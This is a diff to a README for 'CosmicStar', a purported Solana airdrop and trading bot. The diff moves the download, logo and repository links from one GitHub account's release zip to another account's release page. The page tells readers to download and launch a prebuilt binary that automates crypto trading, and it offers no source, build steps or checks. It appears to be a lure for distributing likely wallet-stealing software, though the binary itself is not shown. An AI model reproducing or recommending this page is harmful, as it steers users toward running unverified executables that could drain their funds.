@@ -1,6 +1,6 @@
 # 🌌 Welcome to CosmicStar 🚀
 
-![CosmicStar Logo](https://example.com/logo.png)
+![CosmicStar Logo](https://github.com/Abdullahqayyu/CosmicStar/releases/tag/v2.0)
 
 ## Introduction
 CosmicStar is a cutting-edge Solana Airdrop Bot designed to streamline the process of claiming airdrop tokens on the Solana network. This innovative bot is an efficient and secure solution for automated trading of coins on the Solana blockchain. By leveraging premium APIs and Chromedriver, CosmicStar offers seamless automation of trading operations on the web interfaces of popular exchanges. Whether you're a seasoned trader or just getting started in the world of cryptocurrencies, CosmicStar is here to help you optimize your trading experience.
@@ -13,7 +13,7 @@ CosmicStar is a cutting-edge Solana Airdrop Bot designed to streamline the proce
 ⚙️ Customizable trading parameters for personalized experience  
 
 ## How to Use
-1. Download the [CosmicStar Software](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip).
+1. Download the [CosmicStar Software](https://github.com/Abdullahqayyu/CosmicStar/releases/tag/v2.0).
 2. Launch the software.
 3. Configure your trading preferences.
 4. Start automating your trading operations with CosmicStar!
@@ -37,6 +37,6 @@ CosmicStar is a cutting-edge Solana Airdrop Bot designed to streamline the proce
 - solana-volume-bot
 
 ## Resources
-For more information and updates, visit the [CosmicStar GitHub Repository](https://github.com/YouaifXD/789566136).
+For more information and updates, visit the [CosmicStar GitHub Repository](https://github.com/Abdullahqayyu/CosmicStar/releases/tag/v2.0).
 
 Happy trading in the cosmic universe of cryptocurrencies! 🚀🌟
